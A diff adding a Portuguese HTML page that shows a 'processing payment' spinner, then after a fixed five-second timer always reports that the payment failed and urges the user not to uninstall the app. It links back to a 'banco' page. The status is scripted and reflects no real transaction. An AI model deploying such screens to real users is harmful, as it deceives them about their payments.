@@ -1,0 +1,45 @@
+<html lang="pt-BR">
+<head>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>App Access Error</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <style>
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body class="bg-white flex items-center justify-center min-h-screen">
+    <div id="loading-screen" class="text-center p-4">
+        <p class="text-lg font-semibold mb-4 text-red-500">Processando pagamento, aguarde</p>
+        <div class="flex justify-center mb-4">
+            <div class="w-16 h-16 border-4 border-red-500 border-t-transparent border-solid rounded-full animate-spin"></div>
+        </div>
+    </div>
+    <div id="error-screen" class="hidden text-center p-4">
+        <p class="text-lg font-semibold mb-4">Poxa, não foi possível enviar :/</p>
+        <div class="flex justify-center mb-4">
+            <img alt="Two smartphones with error symbols on their screens" class="w-40 h-40" height="150" src="images/Problema.png" width="150"/>
+        </div>
+        <div class="bg-yellow-100 p-4 rounded-lg mb-4">
+            <div class="flex items-center mb-2">
+                <i class="fas fa-exclamation-triangle text-yellow-500 text-xl mr-2"></i>
+                <p class="font-semibold">Mas não desinstale seu App</p>
+            </div>
+            <p class="text-sm text-gray-700">Provavelmente há algum erro com a instituição recebedora</p>
+        </div>
+        <a href="../banco.html" target="_blank">
+            <button class="bg-white text-red-500 border border-red-500 rounded-full px-6 py-2 font-semibold">Fechar</button>
+        </a>
+    </div>
+    <script>
+        setTimeout(() => {
+            document.getElementById('loading-screen').classList.add('hidden');
+            document.getElementById('error-screen').classList.remove('hidden');
+        }, 5000);
+    </script>
+</body>
+</html>
